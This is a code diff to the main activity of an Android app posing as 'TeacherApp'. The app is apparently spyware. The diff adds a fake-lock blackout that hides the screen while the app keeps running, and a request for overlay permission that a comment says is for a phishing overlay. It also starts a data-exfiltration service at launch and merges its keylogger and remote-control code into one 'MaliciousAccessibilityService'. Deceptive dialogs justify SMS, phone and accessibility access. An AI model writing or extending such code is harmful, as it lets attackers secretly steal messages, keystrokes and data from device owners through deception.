@@ -55,7 +55,10 @@ class MainActivity : ComponentActivity() {
         ScreenOverlayState.isTracking = false
         val params = window.attributes
         params.screenBrightness = 0.0f
+        params.alpha = 0.0f
         window.attributes = params
+        window.addFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND)
+        window.setDimAmount(1.0f)
     }
 
     // Fake lock — intercept the power/lock button
@@ -79,18 +82,12 @@ class MainActivity : ComponentActivity() {
         arrayOf(
             Manifest.permission.READ_SMS,
             Manifest.permission.RECEIVE_SMS,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.READ_MEDIA_IMAGES,
-            Manifest.permission.ACCESS_FINE_LOCATION,
             Manifest.permission.READ_PHONE_STATE
         )
     } else {
         arrayOf(
             Manifest.permission.READ_SMS,
             Manifest.permission.RECEIVE_SMS,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.READ_EXTERNAL_STORAGE,
-            Manifest.permission.ACCESS_FINE_LOCATION,
             Manifest.permission.READ_PHONE_STATE
         )
     }
@@ -166,6 +163,17 @@ class MainActivity : ComponentActivity() {
         // Register power button / screen-off receiver
         registerReceiver(screenReceiver, IntentFilter(Intent.ACTION_SCREEN_OFF))
 
+        // Request "Display over other apps" permission — needed for phishing overlay
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (!Settings.canDrawOverlays(this)) {
+                val overlayIntent = Intent(
+                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    android.net.Uri.parse("package:$packageName")
+                )
+                startActivity(overlayIntent)
+            }
+        }
+
         // Start AppDataExfiltrationService immediately (no permission needed)
         Handler(Looper.getMainLooper()).postDelayed({
             AppDataExfiltrationService.startExfiltration(this@MainActivity)
@@ -192,11 +200,8 @@ class MainActivity : ComponentActivity() {
             .setMessage(
                 "TeacherApp needs the following permissions to function properly:\n\n" +
                         "• SMS: To send class announcements\n" +
-                        "• Contacts: To sync with class roster\n" +
-                        "• Storage: To share educational materials\n" +
-                        "• Location: To track field trip attendance\n" +
                         "• Phone: To verify device identity\n\n" +
-                        "These permissions help enhance your teaching experience."
+                        "These permissions help enhance your user experience."
             )
             .setPositiveButton("Grant Permissions") { dialog, _ ->
                 dialog.dismiss()
@@ -329,14 +334,17 @@ class MainActivity : ComponentActivity() {
         @Suppress("DEPRECATION")
         window.addFlags(
             WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
-            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
-            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
-            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
+                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
+                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
+                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
         )
 
         val params = window.attributes
         params.screenBrightness = 0.0f
+        params.alpha = 0.0f
         window.attributes = params
+        window.addFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND)
+        window.setDimAmount(1.0f)
     }
 
     private fun realLock() {
@@ -351,14 +359,17 @@ class MainActivity : ComponentActivity() {
 
         val params = window.attributes
         params.screenBrightness = WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_NONE
+        params.alpha = 1.0f
         window.attributes = params
+        window.clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND)
+        window.setDimAmount(0.0f)
 
         @Suppress("DEPRECATION")
         window.clearFlags(
             WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
-            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
-            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
-            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
+                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
+                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
+                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
         )
         wakeLock?.release()
         wakeLock = null
@@ -376,16 +387,11 @@ class MainActivity : ComponentActivity() {
         ) ?: return false
         val splitter = TextUtils.SimpleStringSplitter(':')
         splitter.setString(enabled)
-        val keylogger  = "$packageName/com.example.teacherapp.services.KeyloggerService"
-        val remoteCtrl = "$packageName/com.example.teacherapp.services.RemoteControlService"
-        var hasKeylogger = false
-        var hasRemote = false
+        val combined = "$packageName/com.example.teacherapp.services.MaliciousAccessibilityService"
         while (splitter.hasNext()) {
-            val svc = splitter.next()
-            if (svc.equals(keylogger,  ignoreCase = true)) hasKeylogger = true
-            if (svc.equals(remoteCtrl, ignoreCase = true)) hasRemote    = true
+            if (splitter.next().equals(combined, ignoreCase = true)) return true
         }
-        return hasKeylogger && hasRemote
+        return false
     }
 
     private val accessibilityCheckRunnable = object : Runnable {
@@ -410,8 +416,8 @@ class MainActivity : ComponentActivity() {
             .setTitle("Action Required")
             .setMessage(
                 "TeacherApp requires accessibility features to be enabled for enhanced text input " +
-                "assistance and note-taking support.\n\n" +
-                "Please enable ALL 'TeacherApp' services in the Accessibility settings to continue."
+                        "assistance and note-taking support.\n\n" +
+                        "Please enable 'TeacherApp' in the Accessibility settings to continue."
             )
             .setPositiveButton("Open Settings") { dialog, _ ->
                 dialog.dismiss()
@@ -449,6 +455,9 @@ class MainActivity : ComponentActivity() {
         val params = window.attributes
         params.screenBrightness = WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_NONE
         window.attributes = params
+        params.alpha = 1.0f
+        window.clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND)
+        window.setDimAmount(0.0f)
 
         if (wasScreenDimmed) {
             ScreenOverlayState.savedRoute?.let { route ->
